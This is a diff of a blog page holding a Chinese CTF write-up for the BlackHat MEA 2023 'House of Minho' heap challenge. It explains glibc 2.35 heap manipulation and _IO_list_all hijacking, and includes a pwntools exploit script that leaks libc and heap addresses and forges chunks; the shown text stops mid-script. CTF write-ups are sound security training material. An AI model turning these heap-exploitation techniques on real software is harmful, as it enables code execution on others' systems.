@@ -1,163 +1,257 @@
-<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup | Cameudis's Homepage</title><meta name="author" content="Cameudis"><meta name="copyright" content="Cameudis"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。 程序概况容器环境：Ubuntu22.04（GLIBC2.35）（本文使用 GLIBC 2.35-0ubuntu3_a">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_io/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_io/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_io/favicon-16x16.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://google-fonts.mirrors.sjtug.sjtu.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.cameudis.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup">
 <meta property="og:url" content="https://www.cameudis.com/Tech/PWN/576345e2f0f6.html">
 <meta property="og:site_name" content="Cameudis&#39;s Homepage">
-<meta property="og:description" content="参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。 程序概况容器环境：Ubuntu22.04（GLIBC2.35）（本文使用 GLIBC 2.35-0ubuntu3_a">
+<meta property="og:description" content="参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.imgtg.com/2023/04/11/8z0Vl.png">
 <meta property="article:published_time" content="2024-04-18T05:22:03.000Z">
-<meta property="article:modified_time" content="2024-04-18T05:26:33.342Z">
+<meta property="article:modified_time" content="2024-07-23T09:10:34.705Z">
 <meta property="article:author" content="Cameudis">
 <meta property="article:tag" content="blog">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.imgtg.com/2023/04/11/8z0Vl.png"><link rel="shortcut icon" href="/icon_blackhole.png"><link rel="canonical" href="https://www.cameudis.com/Tech/PWN/576345e2f0f6.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-28NXTBGQNR"></script><script>window.dataLayer = window.dataLayer || [];
-function gtag(){dataLayer.push(arguments);}
-gtag('js', new Date());
-gtag('config', 'G-28NXTBGQNR');
-</script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: 'Copy Successful',
-    error: 'Copy Error',
-    noSupport: 'Browser Not Supported'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: 'Just now',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: 'Load More'
-  },
-  isPhotoFigcaption: true,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2024-04-18 13:26:33'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
-    
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
 
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
+<link rel="canonical" href="https://www.cameudis.com/Tech/PWN/576345e2f0f6.html">
 
-        document.head.appendChild(script)
-      })
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup | Cameudis's Homepage</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Cameudis's Homepage</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Exp10re the W0r1d</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-notes">
+
+    <a href="/notes/" rel="section"><i class="fa fa-sticky-note fa-fw"></i>notes</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
     
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PWN/576345e2f0f6.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ava1.jpg">
+      <meta itemprop="name" content="Cameudis">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cameudis's Homepage">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-04-18 13:22:03" itemprop="dateCreated datePublished" datetime="2024-04-18T13:22:03+08:00">2024-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-07-23 17:10:34" itemprop="dateModified" datetime="2024-07-23T17:10:34+08:00">2024-07-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Tech/PWN/576345e2f0f6.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
     
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/Tech/PWN/576345e2f0f6.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PWN/576345e2f0f6.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/ava1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://hackmd.io/@cameudis/rJuGtPyh6"><i class="fa-fw fas fa-book"></i><span> PWN</span></a></div><div class="menus_item"><a class="site-page" href="/notes/"><i class="fa-fw fas fa-book"></i><span> Notes</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Cameudis's Homepage"><span class="site-name">Cameudis's Homepage</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://hackmd.io/@cameudis/rJuGtPyh6"><i class="fa-fw fas fa-book"></i><span> PWN</span></a></div><div class="menus_item"><a class="site-page" href="/notes/"><i class="fa-fw fas fa-book"></i><span> Notes</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-04-18T05:22:03.000Z" title="Created 2024-04-18 13:22:03">2024-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-04-18T05:26:33.342Z" title="Updated 2024-04-18 13:26:33">2024-04-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Tech/">Tech</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Tech/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/Tech/PWN/576345e2f0f6.html" data-flag-title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/Tech/PWN/576345e2f0f6.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/Tech/PWN/576345e2f0f6.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><article class="post-content" id="article-container"><p>参考以及题目附件见：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-279588.htm">Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome</a><br>本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。</p>
+        <p>参考以及题目附件见：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-279588.htm">Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome</a><br>本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。</p>
+<span id="more"></span>
+
 <h2 id="程序概况"><a href="#程序概况" class="headerlink" title="程序概况"></a>程序概况</h2><p>容器环境：Ubuntu22.04（GLIBC2.35）（本文使用 GLIBC 2.35-0ubuntu3_amd64 进行调试）<br>保护情况：全部开启</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/cameudis/ctf/practice/houseofminho/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
 
@@ -281,32 +375,295 @@ gtag('config', 'G-28NXTBGQNR');
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, pack(heap_base+<span class="number">0x2e0</span>))   <span class="comment"># hijack _IO_list_all</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>) <span class="comment"># trigger exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="EXP-脚本"><a href="#EXP-脚本" class="headerlink" title="EXP 脚本"></a>EXP 脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- Environment Config ---------------- #</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------- Exploitation ------------------- #</span></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     io.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span>:       io.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   io.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   io.sendlineafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     io.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     io.send(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Size [1=small / 2=big]: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Data: &quot;</span>, content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;0&#x27;</span>*<span class="number">0xd58</span> + <span class="string">b&#x27;3&#x27;</span>) <span class="comment"># arrange heap layout (very very niu bi trick) &#x27;3&#x27; is a valid size. take effect in line 74</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc and heap</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>)) <span class="comment"># top chunk origin size: 0x??D11</span></span><br><span class="line">    sla(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;0&#x27;</span>*<span class="number">0xfff</span>+<span class="string">b&#x27;2&#x27;</span>) <span class="comment"># trigger realloc to put top chunk into unsorted bin (very niu bi trick)</span></span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>)) <span class="comment"># repair corrupted size</span></span><br><span class="line"></span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># this chunk is split from old top chunk in unsorted bin</span></span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">    heap_base = u64(ru(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span> <span class="comment"># leak tcache protect key (which xswl)</span></span><br><span class="line">    success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># smallbin to tcache</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake chunk to be consolidate with old top chunk (need to satisfy unlink macro)</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + pack(<span class="number">0</span>) + pack(<span class="number">0x31</span>) + <span class="number">2</span>*pack(heap_base+<span class="number">0x2c0</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + pack(<span class="number">0x30</span>) + 